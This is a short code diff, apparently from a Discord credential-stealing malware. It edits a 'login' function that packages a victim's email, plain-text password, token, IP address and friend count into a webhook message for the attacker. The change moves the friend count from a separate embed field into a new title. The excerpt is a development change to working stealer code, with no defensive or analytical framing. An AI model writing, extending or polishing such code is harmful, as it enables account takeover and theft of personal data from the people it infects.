@@ -605,6 +605,7 @@ const login = async (email, password, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
+    "title": `Total Friends (${friends})`,
     embeds: [
       {
         color: config.embed_color,
@@ -643,11 +644,6 @@ const login = async (email, password, token) => {
             name: '<a:satan:846706207632261120> Password:',
             value: `\`${password}\``,
             inline: !0,
-          },
-          {
-            name: '<:944007233820307467:959785232037470208> Friends:',
-            value: `\`${friends}\``,
-            inline: false,
           },
           {
             name: '<:944007233820307467:959785232037470208> IP:',
